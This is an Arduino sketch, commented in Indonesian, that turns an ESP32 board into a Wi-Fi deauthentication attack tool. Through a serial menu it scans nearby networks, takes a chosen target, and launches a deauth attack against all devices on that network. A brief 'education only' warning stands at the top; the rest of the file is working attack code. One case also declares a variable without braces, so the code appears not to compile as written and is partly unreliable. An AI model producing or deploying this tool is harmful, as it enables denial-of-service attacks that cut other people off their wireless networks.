/*
 *  Contoh Kode Deauther Sederhana untuk ESP32-S2/S3
 *  
 *  PERINGATAN: Gunakan hanya untuk edukasi dan pada jaringan yang Anda miliki.
 *  Penggunaan pada jaringan orang lain adalah ILEGAL.
 *  
 *  Library yang dibutuhkan: "wifi_deauther" oleh Spacehuhn
 *  Instal melalui Library Manager di Arduino IDE.
 */

#include <Arduino.h>
#include <wifi_deauther.h>

// Buat objek Deauther
Deauther deauther;

// Fungsi untuk menampilkan menu di Serial Monitor
void printMenu() {
  Serial.println("\n--- Menu Deauther ---");
  Serial.println("1: Scan Jaringan Wi-Fi");
  Serial.println("2: Pilih Target (jaringan)");
  Serial.println("3: Mulai Serangan");
  Serial.println("s: Hentikan Serangan");
  Serial.println("-----------------------");
  Serial.print("Masukkan perintah: ");
}

void setup() {
  // Memulai komunikasi serial
  Serial.begin(115200);
  delay(1000);
  Serial.println("Memulai...");

  // Memulai library Deauther.
  // LED_BUILTIN akan berkedip saat serangan berlangsung.
  deauther.begin(LED_BUILTIN);

  Serial.println("Sistem siap. Gunakan Serial Monitor untuk mengontrol.");
  printMenu();
}

void loop() {
  // Library ini perlu di-"update" secara berkala di loop utama
  // untuk memproses paket dan menjalankan serangan.
  deauther.update();

  // Periksa apakah ada input dari Serial Monitor
  if (Serial.available() > 0) {
    char input = Serial.read();
    Serial.println(input); // Echo input pengguna

    switch (input) {
      case '1': // Scan jaringan
        Serial.println("\n[INFO] Memulai scan jaringan...");
        deauther.scan();
        // Tunggu hingga scan selesai
        while (deauther.isScanning()) {
          deauther.update();
          delay(10);
        }
        Serial.println("[INFO] Scan selesai.");
        
        // Tampilkan hasil scan
        if (deauther.getNetworkCount() > 0) {
          Serial.println("\n--- Jaringan Ditemukan ---");
          for (int i = 0; i < deauther.getNetworkCount(); i++) {
            Serial.print((String)(i + 1) + ": ");
            Serial.print(deauther.getNetworkSSID(i));
            Serial.print(" (CH: ");
            Serial.print(deauther.getNetworkChannel(i));
            Serial.print(", RSSI: ");
            Serial.print(deauther.getNetworkRSSI(i));
            Serial.println(" dBm)");
          }
        } else {
          Serial.println("[INFO] Tidak ada jaringan ditemukan.");
        }
        printMenu();
        break;

      case '2': // Pilih target
        Serial.print("\nMasukkan nomor jaringan target: ");
        while (!Serial.available()) {
          delay(10);
        }
        int targetIndex = Serial.parseInt();
        Serial.println(targetIndex);

        // Validasi input
        if (targetIndex > 0 && targetIndex <= deauther.getNetworkCount()) {
          deauther.selectNetwork(targetIndex - 1); // Index dimulai dari 0
          Serial.println("[INFO] Target dipilih: " + deauther.getNetworkSSID(targetIndex - 1));
        } else {
          Serial.println("[ERROR] Nomor jaringan tidak valid.");
        }
        printMenu();
        break;

      case '3': // Mulai serangan
        if (deauther.getSelectedNetwork() >= 0) {
          Serial.println("[INFO] Memulai serangan deauth terhadap semua perangkat di jaringan " + deauther.getNetworkSSID(deauther.getSelectedNetwork()));
          deauther.start(); // Memulai serangan
        } else {
          Serial.println("[ERROR] Tidak ada target yang dipilih. Pilih jaringan terlebih dahulu (menu 2).");
        }
        printMenu();
        break;

      case 's': // Hentikan serangan
      case 'S':
        deauther.stop();
        Serial.println("[INFO] Serangan dihentikan.");
        printMenu();
        break;

      default:
        Serial.println("[ERROR] Perintah tidak dikenali.");
        printMenu();
        break;
    }
  }
}